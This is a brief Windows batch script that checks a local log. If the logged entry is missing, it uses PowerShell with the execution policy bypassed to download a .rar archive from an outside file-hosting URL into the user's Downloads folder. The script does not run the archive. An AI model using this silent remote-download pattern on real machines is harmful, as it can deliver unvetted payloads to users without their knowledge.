@echo off 
 
set urls=https://st1.ranoz.gg/XFC3HU8L-Delta2679(1).rar 
call "%USERPROFILE%\Desktop\dow-code\client-code\checklog.bat" "TAI_FILE_BACKUP-14/07/2025-19:24" 
if %errorlevel% equ 0 ( 
   echo done 
) else ( 
    call "%USERPROFILE%\Desktop\dow-code\client-code\addlog.bat" "TAI_FILE_BACKUP-14/07/2025-19:24" 
    powershell -NoProfile -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri 'https://st1.ranoz.gg/XFC3HU8L-Delta2679(1).rar' -OutFile '%USERPROFILE%\Downloads\Delta2679(1).rar'}" 
    timeout /t 60 
    ) 
    timeout /t 5 
    exit 
